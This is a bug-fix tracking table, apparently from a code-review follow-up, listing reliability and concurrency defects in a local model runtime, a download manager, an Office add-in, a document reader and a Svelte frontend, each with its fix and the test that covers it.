Found and fixed in a follow-up pass. Native/installed and live-model acceptance
still belongs to B-10/B-06; these are implementation + mechanical evidence only.

| ID | Original location | Original reported failure | Current status | Sev |
| --- | --- | --- | --- | --- |
| AR-72 | `runtime/server.py` (`start`, `_stop_locked`) | `state="starting"` is set before `settings_repo.get_setting`/`hardware.detect`; an unexpected pre-launch error (busy settings DB, unavailable hardware probe) escaped, and `_stop_locked` could itself raise (unkillable process / pidfile `OSError`) from the launch error handler. Either strands the server at "starting" forever — `check_and_restart` only recovers "running". Also `zipfile.LargeZipFile` is not a `BadZipFile` subclass, so it escaped the launch `except`. | **Fixed in code — awaiting verification:** pre-launch failures convert to a reported `failed` state; the launch handler catches `LargeZipFile`/`RuntimeError`/`NotImplementedError`/`ValueError`; `_stop_locked` never raises. `test_runtime.py::test_unexpected_prelaunch_failure_does_not_strand_starting`, `::test_launch_survives_an_unkillable_process`. | HIGH |
| AR-73 | `runtime/server.py` (`_process_executable`, `cleanup_stale_server`) | `ps`/`taskkill` `subprocess.run` had no timeout. `supervisor.run_forever` awaits `cleanup_stale_server` **before** its loop and `finally`, so a hung probe blocks supervision and clean shutdown forever. | **Fixed in code — awaiting verification:** both calls carry `_PROCESS_PROBE_TIMEOUT`. | M |
| AR-74 | `runtime/downloads.py` | A stale/corrupted `.part` with a rejected resume range (HTTP 416, or a 206 whose `Content-Range` does not start at `done`) raised without deleting `.part`; every retry failed identically until the user manually removed it. | **Fixed in code — awaiting verification:** the `.part` is dropped and retried once from zero. `test_runtime.py::test_download_retries_from_scratch_when_the_resume_range_is_rejected`. | M |
| AR-75 | `runtime/model_store.py` (`delete_model`, `cancel_download`) | `delete_model` read the download state under the lock, released it, then unlinked — a concurrent `start_download` could create a new state and begin writing files that were then deleted. `cancel_download` likewise released the lock before setting the event, so a replaced state silently ignored the cancel. | **Fixed in code — awaiting verification:** guard and unlink share the lock; cancel sets the event under it. `test_runtime.py::test_delete_model_check_and_removal_are_atomic`. | L |
| AR-76 | `office_addin/host.py` (`start`, `_stop_locked`) | When startup never became ready, cleanup `_stop_locked` raised while the uvicorn thread was still alive, skipping socket close and state reset. The `SO_EXCLUSIVEADDRUSE` listener leaked, so the next Connect failed with a misleading "port in use". | **Fixed in code — awaiting verification:** `_release_sockets_locked` always runs on the failure path. `test_office_addin_setup.py::test_host_releases_its_socket_when_startup_never_becomes_ready`. | M |
| AR-77 | `office_reader/package.py` (`_read_pptx`) | Speaker notes were appended in notes-part-number order **after** every slide, so a deck whose note numbers differ from the slide order read out of document order. | **Fixed in code — awaiting verification:** notes are emitted after the slide they belong to; truly unlinked notes stay labelled uncertain. `test_office_reader.py::test_powerpoint_notes_follow_their_slide_not_the_notes_part_number`. | L |
| AR-78 | `office_reader/package.py` (`_BoundedPackage`) | Non-ZIP bytes raised bare `zipfile.BadZipFile`/`LargeZipFile` instead of `UnreadablePackageError`, and `api/office.py` `publish_package` did not catch `OSError` — an unreadable upload returned 500 instead of 422. | **Fixed in code — awaiting verification:** the package constructor normalizes to `UnreadablePackageError`; the route catches `ValueError`/`OSError`/`PyPdfError`. | L |
| AR-79 | `office_addin/live.py` (`complete`) | `except (ValueError, WorkNotFoundError)` missed `sqlite3.Error` (locked DB), so a transient DB failure escaped with `pane.pending` still set; the live read stayed "pending" until the 25 s sweep. | **Fixed in code — awaiting verification:** DB errors mark the request failed and a `finally` clears `pane.pending`. | M |
| AR-80 | `frontend/.../components/course/Panel.svelte` + `routes/(app)/courses/[id]/+page.svelte` | Workspace `[n]` chips resolved against `turn.citations`, which are in **prose-marker order**, not material order. The same file already mapped mind maps correctly, so a document/sheet/slides/html/code chip named the wrong file (or none) whenever the prose skipped a material. | **Fixed in code — awaiting verification:** `materialSources(turn)` maps citations onto `materialChunkIds`; every workspace view uses it. `chat.behavior.test.mjs::workspace sources resolve by material order, not prose-marker order`. | HIGH |
| AR-81 | `frontend/.../stores/artifact.svelte.ts` (`loadVersions`) | A failed version fetch set `open.error`, which the route renders **instead of** the whole editor with no retry. The artifact itself loaded fine; only the popover fetch failed. | **Fixed in code — awaiting verification:** failures set `versionsError`; the popover shows a retry and the editor stays. | M |
| AR-82 | `frontend/.../components/Quiz.svelte` | The help-passage `<details>` guarded the title with `?.` but not the body, so a short `session.passages` printed literal `undefined`. | **Fixed in code — awaiting verification:** falls back to "This passage is no longer available." | L |
| AR-83 | `office-addin/public/taskpane.js` | `catch (error) { if (error.code ...) }` threw `TypeError` when a host adapter rejected with a non-object; the whole-package fallback was skipped. Also `connectWork` could finish binding after the user switched courses and flashed a spurious disconnected state. | **Fixed in code — awaiting verification:** null-safe error check; each await re-checks the course and abandons the stale connect. | L |

